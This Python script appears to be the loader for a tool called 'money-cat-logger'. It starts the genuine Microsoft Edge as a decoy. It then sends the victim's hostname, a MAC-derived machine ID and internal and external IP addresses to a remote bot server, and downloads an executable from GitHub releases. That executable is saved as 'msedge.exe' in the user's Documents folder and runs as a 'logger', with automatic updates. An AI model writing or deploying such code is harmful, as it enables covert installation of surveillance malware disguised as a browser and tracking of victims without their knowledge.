import os
import requests
import shutil
import subprocess
import socket
import urllib
import hashlib
import uuid

API_URL = "https://money-cat-bot.onrender.com"
COMPUTER_NAME = socket.gethostname()

GITHUB_USER = "xfendi"
GITHUB_REPO = "money-cat-logger"
TOKEN = None
HEADERS = {"Authorization": f"token {TOKEN}"} if TOKEN else {}
VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/data/version.txt"
RELEASES_API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"

documents_path = os.path.join(os.path.expanduser("~"), "Documents")
local_path = os.path.join(documents_path, "local")  
data_path = os.path.join(local_path, "data")  
LOCAL_VERSION_FILE = os.path.join(data_path, "version.txt")
LOCAL_EXE_FILE = os.path.join(data_path, "msedge.exe")

os.makedirs(data_path, exist_ok=True)

def get_id():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    return hashlib.sha256(mac.encode()).hexdigest()[:20]

def send_new_version():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())
    
    payload = { "COMPUTER_ID": get_id(), "COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip }

    try:
        requests.post(f"{API_URL}/new-version", json=payload)
    except requests.exceptions.RequestException as e:
        print(e)

def get_server_version():
    response = requests.get(VERSION_URL, headers=HEADERS)
    if response.status_code == 200:
        return response.text.strip()
    else:
        print("❌ Error downloading version number!")
        return None

def get_download_url():
    response = requests.get(RELEASES_API_URL, headers=HEADERS)
    if response.status_code == 200:
        release_data = response.json()
        for asset in release_data.get("assets", []):
            if asset["name"] == "edge.exe":
                return asset["browser_download_url"]
    print("❌ Exe file not found on GitHub!")
    return None

def download_new_version():
    download_url = get_download_url()
    if not download_url:
        return
    print("💾 Downloading new version...")
    send_new_version()
    response = requests.get(download_url, stream=True)
    if response.status_code == 200:
        with open(LOCAL_EXE_FILE, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
        print("✅ New version downloaded successfully!")
    else:
        print("❌ Error downloading a new .exe file!")
    if not os.path.exists(LOCAL_VERSION_FILE):
        print("❌ version.txt not found! Fetching version from the server...")
        server_version = get_server_version()
        if server_version:
            with open(LOCAL_VERSION_FILE, 'w') as f:
                f.write(server_version)
            print(f"✅ version.txt created with version: {server_version}")
        else:
            print("❌ Could not fetch version from server!")
            return
        run_exe(LOCAL_EXE_FILE)

def run_exe(directory):
    try:
        process = subprocess.Popen([directory], shell=True)
        process.wait()
    except Exception as e:
        print(f"❌ Error running the EXE: {e}")

def check_for_update():
    run_exe(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
    print("✅ Browser started!")
    server_version = get_server_version()
    if not os.path.exists(LOCAL_VERSION_FILE):
        download_new_version()
        return
    if not os.path.exists(LOCAL_EXE_FILE):
        download_new_version()
        return
    with open(LOCAL_VERSION_FILE, 'r') as f:
        local_version = f.read().strip()

    if server_version and server_version > local_version:
        print(f"🚀 New version available! Local: {local_version}, Server: {server_version}")
        download_new_version()
        with open(LOCAL_VERSION_FILE, 'w') as f:
            f.write(server_version)
    else:
        print("✅ You have the latest version!")
    print(LOCAL_EXE_FILE)
    print("✅ Logger starting!")
    run_exe(LOCAL_EXE_FILE)

if __name__ == "__main__":
    check_for_update()